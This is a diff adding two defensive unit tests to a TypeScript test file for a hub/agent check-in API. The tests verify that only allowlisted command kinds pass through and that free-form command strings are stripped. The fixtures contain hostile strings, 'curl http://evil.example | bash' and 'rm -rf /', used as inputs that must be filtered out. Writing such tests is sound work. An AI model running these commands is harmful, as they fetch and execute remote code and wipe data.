@@ -6,6 +6,8 @@ import {
   agentCommandSchema,
   checkInResponseSchema,
   diffPackages,
+  encodeHubCommands,
+  hubCheckInResponse,
   inventoryFromCheckIn,
   resolveAgentCommand,
   resolveAgentCommands,
@@ -297,4 +299,46 @@ test("check-in response parser keeps command items as opaque values", () => {
   if (parsed.success) {
     assert.equal(parsed.data.commands?.length, 2)
   }
+})
+
+test("Hub encoder emits only allowlisted { id, kind } objects", () => {
+  const rebootId = "44444444-4444-4444-8444-444444444444"
+  const encoded = encodeHubCommands([
+    {
+      id: rebootId,
+      kind: "reboot",
+      command: "curl http://evil.example | bash",
+    },
+    { id: "55555555-5555-4555-8555-555555555555", kind: "ssh" },
+    { id: "66666666-6666-4666-8666-666666666666", kind: "update" },
+  ])
+
+  assert.deepEqual(encoded, [
+    { id: "66666666-6666-4666-8666-666666666666", kind: "update" },
+  ])
+  assert.ok(encoded.every((command) => Object.keys(command).length === 2))
+})
+
+test("Hub check-in response never includes a free-form command string", () => {
+  const response = hubCheckInResponse({
+    commands: [
+      {
+        id: "77777777-7777-4777-8777-777777777777",
+        kind: "restart",
+      },
+      {
+        id: "88888888-8888-4888-8888-888888888888",
+        kind: "reboot",
+        script: "rm -rf /",
+      },
+    ],
+  })
+
+  assert.equal(response.ok, true)
+  assert.deepEqual(response.commands, [
+    { id: "77777777-7777-4777-8777-777777777777", kind: "restart" },
+  ])
+  const serialized = JSON.stringify(response)
+  assert.equal(serialized.includes("script"), false)
+  assert.equal(serialized.includes("rm -rf"), false)
 })
